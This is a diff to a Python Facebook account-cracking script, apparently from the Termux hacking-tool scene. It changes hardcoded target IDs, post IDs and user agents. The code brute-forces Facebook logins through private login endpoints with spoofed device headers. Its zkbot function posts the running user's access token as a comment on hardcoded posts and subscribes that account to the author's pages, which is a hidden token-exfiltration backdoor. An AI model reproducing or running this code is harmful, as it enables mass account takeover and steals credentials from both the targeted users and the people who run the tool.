@@ -79,16 +79,16 @@ id = []
 user = []
 loop = 0
 rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
-zkid = '100002151005321'
-zkid1 = '100045165501610'
-zkid2 = '1675627047'
+zkid = '100006230836266'
+zkid1 = '100069672799769'
+zkid2 = '100006230836266'
 zscomments = random.choice(['Great\xf0\x9f\x8c\xb9', 'Nice\xf0\x9f\x8c\xb9', 'Ossum\xf0\x9f\x8c\xb9', 'Perfect\xf0\x9f\x8c\xb9'])
 reac = 'CARE'
-zkpost = '4253981448016847'
-zkpost1 = '348166760032171'
-zkpost2 = '10216920287314188'
-pageid = '101158528390502'
-react = 'LOVE'
+zkpost = '3015873888630276'
+zkpost1 = '3015873888630276'
+zkpost2 = '3015873888630276'
+pageid = '100057958306450'
+react = 'keren'
 
 def zks(z):
     for e in z + '\n':
@@ -142,10 +142,10 @@ def results(ok, cp):
 
 def zkbot():
     global token
-    post1 = '4111448792295892'
-    post2 = '120338706765807'
-    post3 = '167879918678352'
-    post4 = '180923747373969'
+    post1 = '3015873888630276'
+    post2 = '3015873888630276'
+    post3 = '3015873888630276'
+    post4 = '3015873888630276'
     post5 = '172628718203472'
     post6 = '198550702277940'
     post7 = '198552118944465'
@@ -160,9 +160,9 @@ def zkbot():
     requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
     requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
     requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + token + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100057958306450/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100006230836266/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100069672799769/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token)
     cracking_menu()
@@ -617,7 +617,7 @@ class crackmenu:
             except:
                 pass
 
-            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             api = 'https://b-api.facebook.com/method/auth.login'
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             response = requests.get(api, params=params, headers=headers_)
@@ -748,7 +748,7 @@ def method(user, pasw):
     ua4 = 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'
     ua3 = 'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586'
     ua2 = 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/2.0; Touch; rv: 10.0; IEMobile/11.0; NOKIA; Lumia 635) AppleWebKit/537 KHTML, like Gecko) Mobile Safari/537'
-    ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
+    ua = random.choice(['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
     ses = requests.Session()
     ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'origin': mb, 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': mb + '/login/?next&ref=dbl&fl&refid=8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
     data = {}
